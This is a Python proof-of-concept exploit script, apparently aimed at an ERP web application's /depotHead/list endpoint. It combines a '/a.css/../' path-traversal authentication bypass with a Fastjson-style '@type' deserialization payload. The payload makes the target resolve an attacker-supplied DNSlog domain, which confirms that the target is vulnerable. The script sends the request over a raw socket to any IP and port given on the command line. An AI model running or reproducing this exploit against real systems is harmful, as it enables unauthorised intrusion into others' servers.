import socket, sys, re


def SendGet(res, ip, port):
    request = re.sub('[\r\n]', '\r\n', res)
    port = int(port)
    sock = socket.socket()  # 建立socket
    sock.connect((ip, port))  # 远程连接
    sock.send(request.encode('ascii'))  # 向socket发送数据
    response = b''
    chunk = sock.recv(4096)  # 从socket接收数据
    print(chunk.decode())


def main(ip, port, dnslog):
    test = '{"@type":"java.net.Inet4Address","val":"' + dnslog + '"}'
    test = test.encode('utf-8')
    test = ''.join('%{:02X}'.format(x) for x in test)
    res = '''GET /a.css/../depotHead/list?search={data}&currentPage=1&pageSize=10 HTTP/1.1
Host: {host}
Accept: application/json, text/javascript, */*; q=0.01
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 11_0_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.67 Safari/537.36 Edg/87.0.664.47
X-Requested-With: XMLHttpRequest
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6,pl;q=0.5
Connection: close
'''.format(data=test, host=ip + ':' + port)
    # print(res)
    SendGet(res, ip, port)


main(sys.argv[1], sys.argv[2], sys.argv[3])
